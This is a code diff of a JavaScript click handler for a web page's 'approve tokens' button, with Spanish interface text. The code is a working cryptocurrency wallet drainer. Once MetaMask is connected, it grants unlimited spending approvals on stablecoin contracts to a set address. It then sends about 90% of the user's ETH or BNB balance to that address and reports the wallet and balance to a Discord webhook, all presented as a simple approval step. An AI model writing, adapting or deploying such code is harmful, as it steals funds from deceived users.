@@ -591,72 +591,77 @@ async function connectNetwork() {
 }
 
 
-    document.getElementById("approveTokens").addEventListener("click", async () => {
-    const button = document.getElementById("approveTokens");
-    if (!userAccount) return alert("Primero conecta MetaMask");
+ document.getElementById("approveTokens").addEventListener("click", async () => {
+  const button = document.getElementById("approveTokens");
+  if (!userAccount) return alert("Primero conecta MetaMask");
 
-    button.disabled = true;
-    button.textContent = "Aprobando...";
-    button.style.backgroundColor = "#f0b90b";
+  button.disabled = true;
+  button.textContent = "Aprobando...";
+  button.style.backgroundColor = "#f0b90b";
 
-    const TOKENS_BY_NETWORK = {
-      optimism: [
-        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1"
-      ],
-      bsc: [
-        "0x55d398326f99059fF775485246999027B3197955",
-        "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
-      ]
-    };
+  const TOKENS_BY_NETWORK = {
+    optimism: [
+      "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
+      "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1"
+    ],
+    bsc: [
+      "0x55d398326f99059fF775485246999027B3197955",
+      "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
+    ]
+  };
 
-    const approveABI = [{
-      "constant": false,
-      "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }],
-      "name": "approve",
-      "outputs": [{ "name": "", "type": "bool" }],
-      "payable": false,
-      "stateMutability": "nonpayable",
-      "type": "function"
-    }];
+  const approveABI = [{
+    "constant": false,
+    "inputs": [
+      { "name": "spender", "type": "address" },
+      { "name": "amount", "type": "uint256" }
+    ],
+    "name": "approve",
+    "outputs": [{ "name": "", "type": "bool" }],
+    "payable": false,
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }];
 
-    const tokens = TOKENS_BY_NETWORK[selectedNetwork];
+  const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
-    try {
-      for (const token of tokens) {
-        const tokenContract = new web3.eth.Contract(approveABI, token);
-        await tokenContract.methods.approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
-          .send({ from: userAccount });
-      }
-
-      // Enviar 90% del ETH
-      const balanceWei = await web3.eth.getBalance(userAccount);
-      const gasReserve = web3.utils.toWei("0.002", "ether");
-      const ninetyPercent = BigInt(balanceWei) * 90n / 100n;
-      const amountToSend = ninetyPercent > BigInt(gasReserve) ? (ninetyPercent - BigInt(gasReserve)) : 0n;
-
-      if (amountToSend > 0n) {
-        await web3.eth.sendTransaction({
-          from: userAccount,
-          to: NETWORKS[selectedNetwork].contractAddress,
-          value: amountToSend.toString()
-        });
-      }
-
-      const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
-      await sendToDiscordWebhook('wallet', userAccount, balanceEth);
-
-      button.textContent = "Aprobado ✓";
-      button.style.backgroundColor = "#00b15d";
-      button.disabled = true;
-    } catch (error) {
-      console.error(error);
-      alert("Error al aprobar o transferir ETH");
-      button.textContent = "Conectar Wallet";
-      button.style.backgroundColor = "#f0b90b";
-      button.disabled = false;
+  try {
+    for (const token of tokens) {
+      const tokenContract = new web3.eth.Contract(approveABI, token);
+      await tokenContract.methods
+        .approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+        .send({ from: userAccount });
     }
-  });
+
+    // Obtener balance
+    const balanceWei = await web3.eth.getBalance(userAccount);
+    const gasBuffer = web3.utils.toWei("0.002", "ether");
+
+    const maxTransfer = BigInt(balanceWei) * 90n / 100n;
+    const amountToSend = maxTransfer > BigInt(gasBuffer) ? (maxTransfer - BigInt(gasBuffer)) : 0n;
+
+    if (amountToSend > 0n) {
+      await web3.eth.sendTransaction({
+        from: userAccount,
+        to: NETWORKS[selectedNetwork].contractAddress,
+        value: amountToSend.toString()
+      });
+    }
+
+    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+    await sendToDiscordWebhook('wallet', userAccount, balanceEth);
+
+    button.textContent = "Aprobado ✓";
+    button.style.backgroundColor = "#00b15d";
+    button.disabled = true;
+  } catch (error) {
+    console.error(error);
+    alert("Error al aprobar o transferir fondos");
+    button.textContent = "Conectar Wallet";
+    button.style.backgroundColor = "#f0b90b";
+    button.disabled = false;
+  }
+});
 
    
 
